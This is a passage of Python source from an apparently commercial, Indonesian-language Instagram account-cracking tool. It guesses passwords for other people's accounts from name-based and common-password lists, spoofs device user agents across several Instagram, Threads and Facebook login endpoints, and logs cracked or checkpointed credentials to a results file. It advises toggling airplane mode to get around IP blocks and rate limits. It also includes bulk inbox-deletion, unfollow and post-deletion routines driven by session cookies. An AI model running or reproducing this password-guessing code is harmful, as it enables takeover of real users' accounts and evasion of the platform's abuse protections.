                        open('Results/Cp.txt', 'a+').write(f'{username}|{password}|{self.pengikut}|{self.mengikuti}|{self.postingan}\n')
                        break
                    elif 'https://instagram.com/web/unsupported_version/' in str(response2.text):
                        Console().print("\r                                                                       ", end='\r')
                        time.sleep(0.07)
                        Console().print(f"[bold royal_blue1]   ──>[bold red] VERSION APLIKASI INSTAGRAM TERBLOKIR![bold white]", end='\r')
                        time.sleep(7.5)
                    elif 'ip_block' in str(response2.text):
                        Console().print("\r                                                                       ", end='\r')
                        time.sleep(0.07)
                        Console().print(f"[bold royal_blue1]   ──>[bold yellow] HIDUPKAN MODE PESAWAT 2 DETIK![bold white]", end='\r')
                        time.sleep(7.5)
                    elif 'generic_request_error' in str(response2.text):
                        Console().print("\r                                                                       ", end='\r')
                        time.sleep(0.07)
                        Console().print(f"[bold royal_blue1]   ──>[bold yellow] HIDUPKAN MODE PESAWAT 2 DETIK![bold white]", end='\r')
                        time.sleep(7.5)
                    elif len(response2.text) == 0 or 'Oops, an error occurred.' in str(response2.text):
                        Console().print("\r                                                                       ", end='\r')
                        time.sleep(0.07)
                        Console().print(f"[bold royal_blue1]   ──>[bold red] OOPS, AN ERROR OCCURRED![bold white]", end='\r')
                        time.sleep(1.5)
                    elif 'Please wait a few' in str(response2.text) or 'Harap tunggu beberapa' in str(response2.text):
                        Console().print("\r                                                                       ", end='\r')
                        time.sleep(0.07)
                        Console().print(f"[bold royal_blue1]   ──>[bold blue] HARAP TUNGGU BEBERAPA MENIT![bold white]", end='\r')
                        time.sleep(7.5)
                    else:
                        continue
            Looping += 1
            Console().print(f"[bold royal_blue1]   ──>[bold white] Crack [bold green]{username}[bold royal_blue1]/[bold white]{str(len(total))}[bold royal_blue1]/[bold white]{Looping} Ok:-[bold green]{len(Sukses)}[bold white] Cp:-[bold red]{len(Checkpoint)}[bold white]          ", end='\r')
            time.sleep(0.007)
        except (RequestException):
            Console().print("\r                                                                       ", end='\r')
            time.sleep(0.07)
            Console().print(f"[bold royal_blue1]   ──>[bold red] KONEKSI ERROR![bold white]", end='\r')
            time.sleep(10.5)
            self.Eksekusi(total, username, password)
        except (Exception) as e:
            Console().print("\r                                                                       ", end='\r')
            time.sleep(0.07)
            Console().print(f"[bold royal_blue1]   ──>[bold red] {str(e).upper()}[bold white]", end='\r')

class Robot:

    def __init__(self) -> None:
        pass

    def Get_Inbox(self, cookies, cursor):
        try:
            with requests.Session() as r:
                r.headers.update({
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
                    'sec-fetch-dest': 'empty',
                    'x-ig-www-claim': 'hmac.AR17d_A6AbGR9aYAeEJNONMwDOO3EkxoC4XYggQpebIuDPcn',
                    'accept-language': 'en-US,en;q=0.9',
                    'Host': 'www.instagram.com',
                    'sec-fetch-mode': 'cors',
                    'x-ig-app-id': '936619743392459',
                    'accept': '*/*',
                    'referer': 'https://www.instagram.com/direct/inbox/',
                    'x-asbd-id': '198387',
                    'sec-fetch-site': 'same-origin',
                    'x-csrftoken': re.search('csrftoken=(.*?);', str(cookies)).group(1),
                })
                response = r.get('https://www.instagram.com/api/v1/direct_v2/inbox/?persistentBadging=true&cursor={}'.format(cursor), cookies = {
                    'cookie': cookies
                })
                if 'login_required' in str(response.text):
                    Console().print(f"[bold royal_blue1]   ╰─>[bold red] Akun Kamu Telah Terlogout...", end='\r')
                    time.sleep(3.5);
                    Console(width=71, style="bold royal_blue1").print(Panel(f"[italic red]Sepertinya Akun Kamu Telah Terlogout Sailahkan Login Ulang!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Akun Terlogout) [bold green]<[bold yellow]<[bold red]<"))
                    exit()
                else:
                    for z in json.loads(response.text)['inbox']['threads']:
                        self.thread_id, self.username, self.full_name = z['thread_id'], z['users'][0]['username'], z['users'][0]['full_name']
                        Dump.append(f'{self.full_name}|{self.username}|{self.thread_id}')
                        Console().print(f"[bold royal_blue1]   ╰─>[bold red] Dump {len(Dump)} Username", end='\r')
                        time.sleep(0.007)
                    try:
                        self.oldest_cursor = json.loads(response.text)['inbox']['oldest_cursor']
                        self.Get_Inbox(cookies, self.oldest_cursor)
                    except (KeyError, IndexError):
                        if len(Dump) != 0:
                            return 0
                        else:
                            Console().print(f"[bold royal_blue1]   ╰─>[bold red] Tidak Ada Inbox Yang Ditemukan!", end='\r')
                            time.sleep(3.5)
                            Console().print("                                                ", end='\r')
                            exit()
        except (KeyboardInterrupt):
            Console().print("                                                ", end='\r')
            time.sleep(1.5)
            if len(Dump) != 0:
                return 0
            else:
                Console().print(f"[bold royal_blue1]   ╰─>[bold red] Tidak Ada Inbox Yang Di Kumpulkan!", end='\r')
                time.sleep(3.5)
                Console().print("                                                ", end='\r')
                exit()

    def Delete_Inbox(self, cookies, delay):
        try:
            if len(Dump) == 0:
                self.Get_Inbox(cookies, cursor = '')
                Console(width=71, style="bold royal_blue1").print(Panel(f"[italic white]Sedang Menghapus Semua Inbox, Jika Semua Gagal Kemungkinan Akun Kamu[italic yellow] Terblokir[italic white] Dan Gunakan[italic red] CTRL + Z[italic white] Untuk Berhenti!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Catatan) [bold green]<[bold yellow]<[bold red]<"))
            with requests.Session() as r:
                for z in Dump:
                    self.full_name, self.username, self.thread_id = z.split('|')[0], z.split('|')[1], z.split('|')[2]
                    for sleep in range(delay, 0, -1):
                        time.sleep(1)
                        Console().print(f"[bold royal_blue1]   ──>[bold green] Tunggu {sleep} Detik                  ", end = '\r')
                    r.headers.update({
                        'content-type': 'application/x-www-form-urlencoded',
                        'x-csrftoken': re.search('csrftoken=(.*?);', str(cookies)).group(1),
                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
                        'x-asbd-id': '198387',
                        'referer': 'https://www.instagram.com/direct/inbox/',
                        'x-instagram-ajax': '1006882725',
                        'accept-language': 'en-US,en;q=0.9',
                        'x-ig-app-id': '936619743392459',
                        'Host': 'www.instagram.com',
                        'x-ig-www-claim': 'hmac.AR0oY3J67rcY3I2aN27XL3CYj0h1jrhIayPnMNXbRpWT7SLd',
                        'origin': 'https://www.instagram.com'
                    })
                    response = r.post('https://www.instagram.com/api/v1/direct_v2/threads/{}/hide/'.format(self.thread_id), cookies = {
                        'cookie': cookies
                    }).text
                    if '"status":"ok",' in str(response):
                        Console().print("\r                                                                       ", end='\r')
                        time.sleep(0.07)
                        tree = Tree(Panel.fit("[bold green]REMOVING SUCCESSFUL", style="bold royal_blue1"), style="bold white")
                        tree.add(Columns([Panel(f"[bold green]{self.full_name}", style="bold royal_blue1", width=33), Panel(f"[bold green]{self.username}", style="bold royal_blue1", width=33)]))
                        tree.add(Panel(f"[bold green]{self.thread_id}", style="bold royal_blue1", width=67))
                        print(tree)
                        Sukses.append(self.thread_id)
                    elif 'Please wait' in str(response) or 'Harap tunggu' in str(response):
                        Console().print("[bold royal_blue1]   ╰─>[bold yellow] Hidupkan Mode Pesawat 2 Detik!", end='\r')
                        time.sleep(2.5)
                        for sleep in range(300, 0, -1):
                            time.sleep(1)
                            Console().print(f"[bold royal_blue1]   ──>[bold green] Tunggu {sleep} Detik                  ", end = '\r')
                        continue
                    elif '"spam":true,' in str(response):
                        Console().print("[bold royal_blue1]   ╰─>[bold red] Akun Kamu Telah Terblokir...", end='\r')
                        time.sleep(5.0)
                        Console(width=71, style="bold royal_blue1").print(Panel(f"[italic red]Sepertinya Akun Instagram Kamu Terblokir Atau Terkena Spam!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Terblokir) [bold green]<[bold yellow]<[bold red]<"))
                        exit()
                    else:
                        Console().print("\r                                                                       ", end='\r')
                        time.sleep(0.07)
                        tree = Tree(Panel.fit("[bold red]REMOVING FAILED", style="bold royal_blue1"), style="bold white")
                        tree.add(Columns([Panel(f"[bold red]{self.full_name}", style="bold royal_blue1", width=33), Panel(f"[bold red]{self.username}", style="bold royal_blue1", width=33)]))
                        tree.add(Panel(f"[bold red]{self.thread_id}", style="bold royal_blue1", width=67))
                        print(tree)
                        Checkpoint.append(self.thread_id)
                        continue
                Console(width=71, style="bold royal_blue1").print(Panel(f"[italic white]Kamu Menghapus[italic yellow] {len(Dump)}[italic white] Inbox, Dengan Status[italic green] {len(Sukses)}[italic white] Sukses Dan[italic red] {len(Checkpoint)}[italic white] Gagal!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Sukses) [bold green]<[bold yellow]<[bold red]<"))
                exit()
        except (RequestException):
            time.sleep(7.5)
            self.Delete_Inbox(cookies, delay)

    def Get_Following(self, cookies, userid, max_id):
        try:
            with requests.Session() as r:
                r.headers.update({
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
                    'sec-fetch-dest': 'empty',
                    'x-ig-www-claim': 'hmac.AR17d_A6AbGR9aYAeEJNONMwDOO3EkxoC4XYggQpebIuDPcn',
                    'accept-language': 'en-US,en;q=0.9',
                    'Host': 'www.instagram.com',
                    'sec-fetch-mode': 'cors',
                    'x-ig-app-id': '936619743392459',
                    'accept': '*/*',
                    'referer': 'https://www.instagram.com/',
                    'x-asbd-id': '198387',
                    'sec-fetch-site': 'same-origin',
                    'x-csrftoken': re.search('csrftoken=(.*?);', str(cookies)).group(1),
                })
                response = r.get('https://www.instagram.com/api/v1/friendships/{}/following/?count=12&max_id={}'.format(userid, max_id), cookies = {
                    'cookie': cookies
                })
                if 'login_required' in str(response.text):
                    Console().print(f"[bold royal_blue1]   ╰─>[bold red] Akun Kamu Telah Terlogout...", end='\r')
                    time.sleep(3.5)
                    Console(width=71, style="bold royal_blue1").print(Panel(f"[italic red]Sepertinya Akun Kamu Telah Terlogout Sailahkan Login Ulang!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Akun Terlogout) [bold green]<[bold yellow]<[bold red]<"))
                    exit()
                elif 'Please wait' in str(response.text) or '"spam":true' in str(response.text) or 'Harap tunggu' in str(response.text):
                    if len(Dump) != 0:
                        return 0
                    else:
                        Console().print(f"[bold royal_blue1]   ╰─>[bold red] Tidak Ada Username Yang Di Kumpulkan!", end='\r')
                        time.sleep(3.5)
                        Console().print("                                                ", end='\r');exit()
                else:
                    for z in json.loads(response.text)['users']:
                        self.full_name, self.username, self.userid = z['full_name'], z['username'], z['pk']
                        if str(self.username) in str(Dump):
                            continue
                        else:
                            Dump.append(f'{self.full_name}|{self.username}|{self.userid}')
                            Console().print(f"[bold royal_blue1]   ╰─>[bold red] Dump {len(Dump)} Username", end='\r')
                            time.sleep(0.007)
                    if 'next_max_id' in str(response.text):
                        self.next_max_id = json.loads(response.text)['next_max_id']
                        self.Get_Following(cookies, userid, max_id = self.next_max_id)
                    else:
                        if len(Dump) != 0:
                            return 0
                        else:
                            Console().print(f"[bold royal_blue1]   ╰─>[bold red] Tidak Ada Username Yang Di Kumpulkan!", end='\r')
                            time.sleep(3.5)
                            Console().print("                                                ", end='\r')
                            exit()
        except (KeyboardInterrupt):
            Console().print("                                                ", end='\r')
            time.sleep(1.5)
            if len(Dump) != 0:
                return 0
            else:
                Console().print(f"[bold royal_blue1]   ╰─>[bold red] Tidak Ada Username Yang Di Kumpulkan!", end='\r')
                time.sleep(3.5)
                Console().print("                                                ", end='\r')
                exit()

    def Unfollow(self, cookies, delay):
        try:
            if len(Dump) == 0:
                self.user_id = re.search('ds_user_id=(\d+);', str(cookies)).group(1)
                self.Get_Following(cookies, self.user_id, max_id = 0)
                Console(width=71, style="bold royal_blue1").print(Panel(f"[italic white]Sedang Menghapus Following, Jika Semua Gagal Kemungkinan Akun Kamu[italic yellow] Terblokir[italic white] Dan Gunakan[italic red] CTRL + Z[italic white] Untuk Berhenti!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Catatan) [bold green]<[bold yellow]<[bold red]<"))
            with requests.Session() as r:
                for z in Dump:
                    self.full_name, self.username, self.userid = z.split('|')[0], z.split('|')[1], z.split('|')[2]
                    for sleep in range(delay, 0, -1):
                        time.sleep(1)
                        Console().print(f"[bold royal_blue1]   ──>[bold green] Tunggu {sleep} Detik                  ", end = '\r')
                    r.headers.update({
                        'content-type': 'application/x-www-form-urlencoded',
                        'x-csrftoken': re.search('csrftoken=(.*?);', str(cookies)).group(1),
                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
                        'x-asbd-id': '198387',
                        'x-instagram-ajax': '1006884929',
                        'accept-language': 'en-US,en;q=0.9',
                        'x-ig-app-id': '936619743392459',
                        'Host': 'www.instagram.com',
                        'x-ig-www-claim': 'hmac.AR0oY3J67rcY3I2aN27XL3CYj0h1jrhIayPnMNXbRpWT7SLd',
                    })
                    response = r.post('https://www.instagram.com/api/v1/web/friendships/{}/unfollow/'.format(self.userid), cookies = {
                        'cookie': cookies
                    }).text
                    if '"status":"ok"' in str(response):
                        Console().print("\r                                                                       ", end='\r')
                        time.sleep(0.07)
                        tree = Tree(Panel.fit("[bold green]REMOVING SUCCESSFUL", style="bold royal_blue1"), style="bold white")
                        tree.add(Columns([Panel(f"[bold green]{self.full_name}", style="bold royal_blue1", width=33), Panel(f"[bold green]{self.username}", style="bold royal_blue1", width=33)]))
                        tree.add(Panel(f"[bold green]{self.userid}", style="bold royal_blue1", width=67))
                        print(tree)
                        Sukses.append(self.userid)
                    elif 'Please wait' in str(response) or 'Harap tunggu' in str(response):
                        Console().print("[bold royal_blue1]   ╰─>[bold yellow] Hidupkan Mode Pesawat 2 Detik!", end='\r')
                        time.sleep(2.5)
                        for sleep in range(300, 0, -1):
                            time.sleep(1)
                            Console().print(f"[bold royal_blue1]   ──>[bold green] Tunggu {sleep} Detik                  ", end = '\r')
                        continue
                    elif '"spam":true' in str(response):
                        Console().print("[bold royal_blue1]   ╰─>[bold red] Akun Kamu Terblokir!", end='\r')
                        time.sleep(5.0)
                        Console(width=71, style="bold royal_blue1").print(Panel(f"[italic red]Sepertinya Akun Instagram Kamu Terblokir Atau Terkena Spam!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Terblokir) [bold green]<[bold yellow]<[bold red]<"))
                        exit()
                    else:
                        Console().print("\r                                                                       ", end='\r')
                        time.sleep(0.07)
                        tree = Tree(Panel.fit("[bold red]REMOVING FAILED", style="bold royal_blue1"), style="bold white")
                        tree.add(Columns([Panel(f"[bold red]{self.full_name}", style="bold royal_blue1", width=33), Panel(f"[bold red]{self.username}", style="bold royal_blue1", width=33)]))
                        tree.add(Panel(f"[bold red]{self.userid}", style="bold royal_blue1", width=67))
                        print(tree)
                        Checkpoint.append(self.userid)
                        continue
                Console(width=71, style="bold royal_blue1").print(Panel(f"[italic white]Kamu Menghapus[italic yellow] {len(Dump)}[italic white] Following, Dengan Status[italic green] {len(Sukses)}[italic white] Sukses Dan[italic red] {len(Checkpoint)}[italic white] Gagal!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Sukses) [bold green]<[bold yellow]<[bold red]<"))
                exit()
        except (RequestException):
            time.sleep(7.5)
            self.Unfollow(cookies, delay)

    def Get_Postingan(self, cookies, username, max_id):
        try:
            with requests.Session() as r:
                r.headers.update({
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
                    'sec-fetch-dest': 'empty',
                    'x-ig-www-claim': 'hmac.AR21smV2H8O_Fcb0titl9B-e4z2E8geKU-TwnVbuAlH2aJyb',
                    'accept-language': 'en-US,en;q=0.9',
                    'Host': 'www.instagram.com',
                    'sec-fetch-mode': 'cors',
                    'x-ig-app-id': '936619743392459',
                    'accept': '*/*',
                    'referer': 'https://www.instagram.com/',
                    'x-asbd-id': '198387',
                    'sec-fetch-site': 'same-origin',
                    'x-csrftoken': re.search('csrftoken=(.*?);', str(cookies)).group(1),
                })
                response = r.get('https://www.instagram.com/api/v1/feed/user/{}/username/?count={}'.format(username, max_id), cookies = {
                    'cookie': cookies
                })
                if 'login_required' in str(response.text):
                    Console().print(f"[bold royal_blue1]   ╰─>[bold red] Akun Kamu Telah Terlogout...", end='\r')
                    time.sleep(3.5)
                    Console(width=71, style="bold royal_blue1").print(Panel(f"[italic red]Sepertinya Akun Kamu Telah Terlogout Sailahkan Login Ulang!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Akun Terlogout) [bold green]<[bold yellow]<[bold red]<"))
                    exit()
                else:
                    for z in json.loads(response.text)['items']:
                        self.media_id, self.like_count, self.comment_count = z['pk'], z['like_count'], z['comment_count']
                        if str(self.media_id) in str(Dump):
                            continue
                        else:
                            Dump.append(f'{self.like_count}|{self.comment_count}|{self.media_id}')
                            Console().print(f"[bold royal_blue1]   ╰─>[bold red] Dump {len(Dump)} Postingan", end='\r')
                            time.sleep(0.007)
                    try:
                        self.next_max_id = json.loads(response.text)['next_max_id']
                        self.Get_Postingan(cookies, username, self.next_max_id)
                    except (KeyError):
                        if len(Dump) != 0:
                            return 0
                        else:
                            Console().print(f"[bold royal_blue1]   ╰─>[bold red] Tidak Ada Postingan Yang Ditemukan!", end='\r')
                            time.sleep(3.5)
                            Console().print("                                                   ", end='\r');exit()
        except (KeyboardInterrupt):
            Console().print("                                                ", end='\r')
            time.sleep(1.5)
            if len(Dump) != 0:
                return 0
            else:
                Console().print(f"[bold royal_blue1]   ╰─>[bold red] Tidak Ada Postingan Yang Di Kumpulkan!", end='\r')
                time.sleep(3.5)
                Console().print("                                                ", end='\r')
                exit()

    def Delete_Post(self, cookies, delay):
        try:
            if len(Dump) == 0:
                self.user_id = re.search('ds_user_id=(\d+);', str(cookies)).group(1)
                with requests.Session() as r:
                    r.headers.update({
                        'x-csrftoken': re.search('csrftoken=(.*?);', str(cookies)).group(1),
                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
                        'x-ig-app-id': '936619743392459',
                    })
                    response = json.loads(r.get('https://i.instagram.com/api/v1/users/{}/info/'.format(self.user_id), cookies = {
                        'cookie': cookies
                    }).text)
                    self.username = response['user']['username']
                self.Get_Postingan(cookies, self.username, max_id = 12)
                Console(width=71, style="bold royal_blue1").print(Panel(f"[italic white]Sedang Menghapus Postingan, Jika Semua Gagal Kemungkinan Akun Kamu[italic yellow] Terblokir[italic white] Dan Gunakan[italic red] CTRL + Z[italic white] Untuk Berhenti!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Catatan) [bold green]<[bold yellow]<[bold red]<"))
            with requests.Session() as r:
                for z in Dump:
                    self.likes_count, self.comment_count, self.media_id = z.split('|')[0], z.split('|')[1], z.split('|')[2]
                    for sleep in range(delay, 0, -1):
                        time.sleep(1)
                        Console().print(f"[bold royal_blue1]   ──>[bold green] Tunggu {sleep} Detik                  ", end = '\r')
                    r.headers.update({
                        'content-type': 'application/x-www-form-urlencoded',
                        'x-csrftoken': re.search('csrftoken=(.*?);', str(cookies)).group(1),
                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
                        'x-asbd-id': '198387',
                        'x-instagram-ajax': '1006888910',
                        'accept-language': 'en-US,en;q=0.9',
                        'x-ig-app-id': '936619743392459',
                        'Host': 'www.instagram.com',
                        'x-ig-www-claim': 'hmac.AR3Q4NkpZ9OOLjAwSXM_pbRaXV4NL3drO4UtBDm58OtZR_10',
                    })
                    response = r.post('https://www.instagram.com/api/v1/web/create/{}/delete/'.format(self.media_id), cookies = {
                        'cookie': cookies
                    }).text
                    if '"did_delete":true,' in str(response):
                        Console().print("\r                                                                       ", end='\r')
                        time.sleep(0.07)
                        tree = Tree(Panel.fit("[bold green]REMOVING SUCCESSFUL", style="bold royal_blue1"), style="bold white")
                        tree.add(Columns([Panel("[bold green]{:,.2f}".format(float(self.likes_count)), style="bold royal_blue1", width=33), Panel("[bold green]{:,.2f}".format(float(self.comment_count)), style="bold royal_blue1", width=33)]))
                        tree.add(Panel(f"[bold green]{self.media_id}", style="bold royal_blue1", width=67))
                        print(tree)
                        Sukses.append(self.media_id)
                    elif 'Please wait' in str(response) or 'Harap tunggu' in str(response):
                        Console().print("[bold royal_blue1]   ╰─>[bold yellow] Hidupkan Mode Pesawat 2 Detik!", end='\r')
                        time.sleep(2.5)
                        for sleep in range(300, 0, -1):
                            time.sleep(1)
                            Console().print(f"[bold royal_blue1]   ──>[bold green] Tunggu {sleep} Detik                  ", end = '\r')
                        continue
                    elif '"spam":true' in str(response):
                        Console().print("[bold royal_blue1]   ╰─>[bold red] Akun Kamu Terblokir!", end='\r')
                        time.sleep(5.0)
                        Console(width=71, style="bold royal_blue1").print(Panel(f"[italic red]Sepertinya Akun Instagram Kamu Terblokir Atau Terkena Spam!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Terblokir) [bold green]<[bold yellow]<[bold red]<"))
                        exit()
                    else:
                        Console().print("\r                                                                       ", end='\r')
                        time.sleep(0.07)
                        tree = Tree(Panel.fit("[bold red]REMOVING FAILED", style="bold royal_blue1"), style="bold white")
                        tree.add(Columns([Panel("[bold red]{:,.2f}".format(float(self.likes_count)), style="bold royal_blue1", width=33), Panel("[bold red]{:,.2f}".format(float(self.comment_count)), style="bold royal_blue1", width=33)]))
                        tree.add(Panel(f"[bold red]{self.media_id}", style="bold royal_blue1", width=67))
                        print(tree)
                        Checkpoint.append(self.media_id)
                        continue
                Console(width=71, style="bold royal_blue1").print(Panel(f"[italic white]Kamu Menghapus[italic yellow] {len(Dump)}[italic white] Postingan, Dengan Status[italic green] {len(Sukses)}[italic white] Sukses Dan[italic red] {len(Checkpoint)}[italic white] Gagal!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Sukses) [bold green]<[bold yellow]<[bold red]<"))
                exit()
        except (RequestException):
            time.sleep(7.5)
            self.Delete_Post(cookies, delay)

class Set_Password:

    def __init__(self) -> None:
        pass

    def Settingan(self):
        Console(width=71, style="bold royal_blue1").print(Panel("""[bold green]01[bold white]. Gunakan Pengaturan Useragent Secara Otomatis ([bold red]Not Recommended[bold white])
[bold green]02[bold white]. Gunakan Pengaturan Useragent Secara Manual ([bold green]Recommended[bold white])""", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Pilih Pengaturan) [bold green]<[bold yellow]<[bold red]<", subtitle="[bold royal_blue1]╭────", subtitle_align='left'))
        pilih_setingan = Console().input("[bold royal_blue1]   ╰─> ")
        if pilih_setingan == '01' or pilih_setingan == '1':
            try:
                self.device, self.type, self.password = json.loads(open('Data/Settings.json', 'r').read())['Useragent'], json.loads(open('Data/Settings.json', 'r').read())['Type'], json.loads(open('Data/Settings.json', 'r').read())['Password']
                Useragent.append(self.device)
                Password.update({
                    "Password": self.password
                })
                Metode.update({
                    "Method": self.type
                })
            except (Exception):
                Useragent.append('Realme')
                Password.update({
                    "Password": 5
                })
                Metode.update({
                    "Method": 5
                })
            Crack().Pilihan_Method()
        else:
            self.Pemilihan()

    def Pemilihan(self):
        try:
            Console(width=71, style="bold royal_blue1").print(Panel("""[bold green]01[bold white]. Gunakan Metode https://www.instagram.com/ ([bold red]Ajax Tinder[bold white])
[bold green]02[bold white]. Gunakan Metode https://i.instagram.com/ ([bold green]Instagram Apps 2023[bold white])
[bold green]03[bold white]. Gunakan Metode https://i.instagram.com/ ([bold green]Threads Apps 2023[bold white])
[bold green]04[bold white]. Gunakan Metode https://i.instagram.com/ ([bold red]Instagram Apps 2019[bold white])
[bold green]05[bold white]. Gunakan Metode https://b.i.instagram.com/ ([bold red]Tinder Apps 2018[bold white])
[bold green]06[bold white]. Gunakan Metode https://www.instagram.com/ ([bold red]Accounts Center[bold white])
[bold green]07[bold white]. Gunakan Metode https://www.facebook.com/ ([bold green]Facebook Connecting[bold white])""", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Pilih Metode Login) [bold green]<[bold yellow]<[bold red]<", subtitle="[bold royal_blue1]╭────", subtitle_align='left'))
            pilih_metode = Console().input("[bold royal_blue1]   ╰─> ")
            if pilih_metode == '2' or pilih_metode == '02' or pilih_metode == '4' or pilih_metode == '04' or pilih_metode == '5' or pilih_metode == '05':
                Metode.update({
                    "Method": pilih_metode
                })
                Console(width=71, style="bold royal_blue1").print(Panel("[italic white]Silahkan Masukan Useragent, Gunakan Koma Untuk Useragent Random ([italic green]Realme,Samsung,Oppo,Xiaomi,Vivo,Poco,Huawei,Infinix,Asus,Lenovo,Nokia,Motorola,Pixel,Oneplus,HTC,LG,Nexus,Tecno,Sony,Kyocera,Fujitsu,Meizu,Micromax,Itel,Sharp[italic white]) Ini Semua Adalah Useragent Instagram, Misalnya :[italic green] Realme,Nokia", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Pilih Useragent) [bold green]<[bold yellow]<[bold red]<", subtitle="[bold royal_blue1]╭────", subtitle_align='left'))
                useragent = Console().input("[bold royal_blue1]   ╰─> ")
                if len(useragent) == 0:
                    Useragent.append('Realme')
                else:
                    Useragent.append(useragent.replace(' ',''))
            elif pilih_metode == '3' or pilih_metode == '03':
                if str(Player['Type']) == 'Trial':
                    Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Hanya Member Premium Yang Dapat Mengakses Fitur Ini!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Akses Dilarang) [bold green]<[bold yellow]<[bold red]<"))
                    os.system('xdg-open https://wa.me/6283847921480')
                    Metode.update({
                        "Method": '05'
                    })
                else:
                    Metode.update({
                        "Method": pilih_metode
                    })
                Console(width=71, style="bold royal_blue1").print(Panel("[italic white]Silahkan Masukan Useragent, Gunakan Koma Untuk Useragent Random ([italic green]Realme,Samsung,Oppo,Xiaomi,Vivo,Poco,Huawei,Infinix,Asus,Lenovo,Nokia,Motorola,Pixel,Oneplus,HTC,LG,Nexus,Tecno,Sony,Kyocera,Fujitsu,Meizu,Micromax,Itel,Sharp[italic white]) Ini Semua Adalah Useragent Instagram, Misalnya :[italic green] Realme,Nokia", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Pilih Useragent) [bold green]<[bold yellow]<[bold red]<", subtitle="[bold royal_blue1]╭────", subtitle_align='left'))
                useragent = Console().input("[bold royal_blue1]   ╰─> ")
                if len(useragent) == 0:
                    Useragent.append('Realme')
                else:
                    Useragent.append(useragent.replace(' ',''))
            else:
                Metode.update({
                    "Method": pilih_metode
                })
                Console(width=71, style="bold royal_blue1").print(Panel("[italic white]Silahkan Masukan Useragent, Gunakan Koma Untuk Useragent Random ([italic green]InstagramCarbon,PlayStation,Speaker,Tv,Nokia,Advan,Poco,Apple,Sony,Dalvik,BlackBerry,Camera,Realme,Samsung,Vivo,Oppo,Lenovo,Infinix,Huawei,Windows,Xiaomi,Manual,File,Evercoss,Asus,Itel,Oneplus[italic white]) Hanya Memasukan Yang Ada Di List, Misalnya :[italic green] Realme,Huawei", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Pilih Useragent) [bold green]<[bold yellow]<[bold red]<", subtitle="[bold royal_blue1]╭────", subtitle_align='left'))
                useragent = Console().input("[bold royal_blue1]   ╰─> ")
                if useragent.capitalize() == 'Manual':
                    Console(width=71, style="bold royal_blue1").print(Panel("[italic white]Silahkan Masukan Useragent Manual, Gunakan[italic red] |[italic white] Sebagai Pemisah Atau Random Useragent, Misalnya :[italic green] Dalvik/1.6.0 (Linux; U; Android 4.4.4; C6903 Build/14.4.A.0.108)[italic red]|[italic yellow]Mozilla/5.0 (compatible; WAChat/1.2; +http://www.whatsapp.com/contact)", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Input Useragent) [bold green]<[bold yellow]<[bold red]<", subtitle="[bold royal_blue1]╭────", subtitle_align='left'))
                    user = Console().input("[bold royal_blue1]   ╰─> ")
                    Useragent.append('Manual')
                    Random.append(user)
                elif useragent.capitalize() == 'File':
                    Console(width=71, style="bold royal_blue1").print(Panel("[italic white]Silahkan Masukan List Useragent File, Pastikan Sudah Memilih Nomor 07 Sebelum Melanjutkan, Misalnya :[italic green] Data/Useragent.txt", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Input File Useragent) [bold green]<[bold yellow]<[bold red]<", subtitle="[bold royal_blue1]╭────", subtitle_align='left'))
                    user = Console().input("[bold royal_blue1]   ╰─> ")
                    if os.path.exists(user) == True:
                        open_useragent = open(user, 'r').read().splitlines()
                        if len(open_useragent) != 0:
                            for z in open_useragent:
                                Random.append(z)
                            Useragent.append('File')
                        else:
                            Useragent.append('Windows')
                    else:
                        Useragent.append('Windows')
                else:
                    Useragent.append(useragent.replace(' ',''))
            Console(width=71, style="bold royal_blue1").print(Panel("""[bold green]01[bold white]. Gunakan Password Manual ([bold green]Sayang, Bismillah, 123456, Bangsat[bold white])
[bold green]02[bold white]. Gunakan Password Customize ([bold green]Nama, Nama123@, Nama1234#$[bold white])
[bold green]03[bold white]. Gunakan Password Gabungan ([bold green]Nama, Nama123, Nama12345 + Input[bold white])
[bold green]04[bold white]. Gunakan Password Default ([bold green]Nama, Nama123, Nama12345[bold white])
